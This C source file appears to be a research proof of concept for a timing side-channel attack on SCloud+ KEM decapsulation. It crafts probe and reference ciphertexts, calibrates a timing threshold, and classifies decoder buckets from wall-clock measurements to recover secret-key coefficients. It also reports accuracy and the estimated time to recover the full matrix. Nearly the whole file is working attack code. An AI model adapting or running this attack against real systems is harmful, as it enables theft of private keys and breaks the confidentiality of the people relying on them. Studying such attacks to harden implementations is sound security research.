/* PHYSICAL timing recovery of secret-matrix coefficients.
 *
 * Unlike recover_all_indices.c (which reads the NOISELESS instrumented sampler
 * bucket), this program classifies each probe's bucket from REAL wall-clock
 * timing of full scloud_kemdecaps, exactly what a blind/remote attacker sees.
 *
 * Blind bucket decision (no secret knowledge):
 *   - Attacker builds reference ciphertexts of KNOWN bucket offline: C1=0,
 *     C2=Encode(m_ref); decoded message is m_ref, bucket = profile(m_ref) with
 *     the public key. Find one m giving bucket 53 (R_lo) and one giving 54.
 *   - gap = median( t(R_hi) - t(R_lo) ) over interleaved pairs; threshold=gap/2.
 *   - For each probe P: interleave-measure (P, R_lo) N times, Y=t_P - t_Rlo;
 *     classify bucket 54 if median(Y) > threshold else 53.
 *   - Trit guess: the s in {-1,0,1} whose OFFLINE-predicted (base,shift) bucket
 *     code matches the two measured buckets (same decoder as recover_all).
 *
 * Reports per-coefficient wall-clock and real accuracy vs ground truth.
 * Args: [count] [N_per_probe] [i_coordinate] [N_cal] [key_seed]
 */
#define main recover_demo_unused_main
#include "recover_demo.c"
#undef main
#include <time.h>

static const unsigned aval[scloudplus_nbar] = {1,8,1,4,2,1,16,4,1,2,4};
static const int dval[scloudplus_nbar]      = {-1,+1,-1,+1,-1,+1,-1,+1,+1,+1,-1};
static const uint16_t rows[scloudplus_nbar][scloudplus_nbar] = {
    {256,0,576,512,256,128,192,512,384,896,576},
    {768,512,768,320,256,960,448,0,896,0,576},
    {256,256,512,128,960,0,768,640,512,960,384},
    {64,64,448,256,576,64,832,256,576,640,704},
    {704,512,384,512,512,64,256,576,768,384,320},
    {448,768,384,640,960,256,0,576,576,960,640},
    {128,768,768,0,192,64,768,768,64,768,256},
    {0,640,640,832,704,320,704,0,512,448,960},
    {320,256,128,128,128,0,960,512,512,256,128},
    {896,256,512,768,256,448,320,768,0,768,384},
    {512,128,256,640,640,448,832,704,512,640,768}
};

static uint64_t mono_ns(void)
{
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static volatile uint8_t sink;
static double time_decaps(const uint8_t *sk, const uint8_t *ct)
{
    uint8_t ss[scloudplus_ss];
    uint64_t t0 = mono_ns();
    scloud_kemdecaps(sk, ct, ss);
    uint64_t t1 = mono_ns();
    sink ^= ss[0];
    return (double)(t1 - t0);
}

static int cmp_d(const void *a, const void *b)
{ double x = *(const double*)a, y = *(const double*)b; return (x>y)-(x<y); }

static double median(double *x, unsigned n)
{
    qsort(x, n, sizeof(double), cmp_d);
    return n & 1 ? x[n/2] : 0.5*(x[n/2-1]+x[n/2]);
}

/* decoded message of C1=0, C2=encode(m_ref) probe is m_ref; build its ct */
static void build_ref(const uint8_t *m, uint8_t *ct)
{
    uint16_t c1[(size_t)scloudplus_mbar * scloudplus_n] = {0};
    uint16_t c2[(size_t)scloudplus_mbar * scloudplus_nbar];
    msg_encode(m, c2);
    pack_c1(c1, ct); pack_c2(c2, ct + scloudplus_c1);
}

static void build_probe(const uint16_t *v, unsigned c1_col, unsigned a, uint8_t *ct)
{
    uint16_t c1[(size_t)scloudplus_mbar * scloudplus_n] = {0};
    uint16_t c2[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    c1[c1_col] = (uint16_t)a;
    memcpy(c2, v, sizeof(v[0]) * scloudplus_nbar);
    pack_c1(c1, ct); pack_c2(c2, ct + scloudplus_c1);
}

/* offline predicted bucket for trit s at output coordinate `target` */
static size_t pred_bucket(const uint8_t *pke_pk, const uint16_t *v,
                          unsigned target, unsigned a, int s)
{
    uint16_t d[(size_t)scloudplus_mbar * scloudplus_nbar] = {0};
    uint8_t mu[scloudplus_ss];
    for (unsigned j = 0; j < scloudplus_nbar; j++) {
        int g = (j == target) ? s : 0;
        d[j] = (uint16_t)((int)v[j] - (int)a*g) & scloudplus_q_mask;
    }
    msg_decode(d, mu);
    size_t b, r; profile_message(pke_pk, mu, &b, &r);
    return b;
}

/* classify a probe's bucket from real interleaved timing vs reference R_lo(53) */
static size_t timed_bucket(const uint8_t *sk, const uint8_t *ct_probe,
                           const uint8_t *ct_ref_lo, double thr,
                           unsigned N, double *diffs)
{
    for (unsigned i = 0; i < N; i++) {
        double tp, tr;
        if (xr() & 1) { tp = time_decaps(sk, ct_probe); tr = time_decaps(sk, ct_ref_lo); }
        else          { tr = time_decaps(sk, ct_ref_lo); tp = time_decaps(sk, ct_probe); }
        diffs[i] = tp - tr;
    }
    return median(diffs, N) > thr ? 54 : 53;
}

int main(int argc, char **argv)
{
    const unsigned count = argc > 1 ? (unsigned)strtoul(argv[1],0,10) : 11;
    const unsigned N     = argc > 2 ? (unsigned)strtoul(argv[2],0,10) : 2000;
    const unsigned coord = argc > 3 ? (unsigned)strtoul(argv[3],0,10) : 0;
    const unsigned Ncal  = argc > 4 ? (unsigned)strtoul(argv[4],0,10) : 4000;
    if (argc > 5) krng = strtoull(argv[5],0,10) | 1ULL;

    uint8_t pk[scloudplus_pk], sk[scloudplus_kem_sk];
    if (scloud_kemkeygen(pk, sk)) return 1;
    const uint8_t *pke_pk = sk + scloudplus_pke_sk;
    uint16_t S[(size_t)scloudplus_n * scloudplus_nbar];
    unpack_sk(sk, S);
    memo = calloc(MEMO_SLOTS, sizeof(*memo));
    if (!memo) return 1;

    /* find reference messages with bucket 53 and 54 (C1=0 => decoded == m) */
    uint8_t m_lo[scloudplus_ss] = {0}, m_hi[scloudplus_ss] = {0};
    int have_lo = 0, have_hi = 0;
    for (unsigned c = 0; c < 100000 && !(have_lo && have_hi); c++) {
        uint8_t m[scloudplus_ss] = {0};
        for (unsigned j = 0; j < 8; j++) m[j] = (uint8_t)(c >> (8*j));
        size_t b, r; profile_message(pke_pk, m, &b, &r);
        if (b == 53 && !have_lo) { memcpy(m_lo, m, sizeof(m)); have_lo = 1; }
        if (b == 54 && !have_hi) { memcpy(m_hi, m, sizeof(m)); have_hi = 1; }
    }
    if (!have_lo || !have_hi) { fprintf(stderr, "no references found\n"); return 2; }
    uint8_t ct_lo[scloudplus_ctx], ct_hi[scloudplus_ctx];
    build_ref(m_lo, ct_lo); build_ref(m_hi, ct_hi);

    /* warm up */
    for (unsigned i = 0; i < 200; i++) { (void)time_decaps(sk, ct_lo); (void)time_decaps(sk, ct_hi); }

    /* calibrate gap = median(t_hi - t_lo), threshold = gap/2 */
    double *cal = malloc(sizeof(double) * Ncal);
    for (unsigned i = 0; i < Ncal; i++) {
        double thi, tlo;
        if (xr() & 1) { thi = time_decaps(sk, ct_hi); tlo = time_decaps(sk, ct_lo); }
        else          { tlo = time_decaps(sk, ct_lo); thi = time_decaps(sk, ct_hi); }
        cal[i] = thi - tlo;
    }
    double gap = median(cal, Ncal);
    double thr = gap / 2.0;
    fprintf(stderr, "references: m_lo bucket=53 m_hi bucket=54; "
            "calibrated gap=%.1f ns threshold=%.1f ns (Ncal=%u)\n", gap, thr, Ncal);
    free(cal);

    double *db = malloc(sizeof(double)*N), *ds = malloc(sizeof(double)*N);
    printf("k,coord,true,guess,base_bucket,shift_bucket,correct,coef_seconds\n");
    unsigned correct = 0, done = 0;
    uint64_t wall0 = mono_ns();
    for (unsigned k = 0; k < count; k++) {
        uint16_t v[scloudplus_nbar], vs[scloudplus_nbar];
        memcpy(v, rows[coord], sizeof(v));
        memcpy(vs, v, sizeof(vs));
        vs[coord] = (uint16_t)((vs[coord] + dval[coord] + scloudplus_q) & scloudplus_q_mask);
        unsigned a = aval[coord];
        uint8_t ctb[scloudplus_ctx], cts[scloudplus_ctx];
        build_probe(v, k, a, ctb);
        build_probe(vs, k, a, cts);

        uint64_t c0 = mono_ns();
        size_t cb = timed_bucket(sk, ctb, ct_lo, thr, N, db);
        size_t cs = timed_bucket(sk, cts, ct_lo, thr, N, ds);
        double coef_s = (double)(mono_ns() - c0) / 1e9;

        /* decode trit from measured buckets via offline prediction match */
        int guess = 99;
        for (int s = -1; s <= 1; s++)
            if ((size_t)pred_bucket(pke_pk, v, coord, a, s) == cb &&
                (size_t)pred_bucket(pke_pk, vs, coord, a, s) == cs) guess = s;
        int tv = center(S[(size_t)coord*scloudplus_n + k]);
        int ok = (guess == tv);
        correct += ok; done++;
        printf("%u,%u,%d,%d,%zu,%zu,%d,%.2f\n", k, coord, tv, guess, cb, cs, ok, coef_s);
        fflush(stdout);
    }
    double wall = (double)(mono_ns() - wall0) / 1e9;
    fprintf(stderr, "PHYSICAL row recovery: %u/%u correct (%.1f%%) in %.1f s; "
            "mean %.2f s/coef; one full row (1184) ~= %.1f h; "
            "full matrix (13024) ~= %.1f days\n",
            correct, done, 100.0*correct/done, wall, wall/done,
            (wall/done)*1184/3600.0, (wall/done)*13024/86400.0);
    free(db); free(ds); free(memo);
    return 0;
}
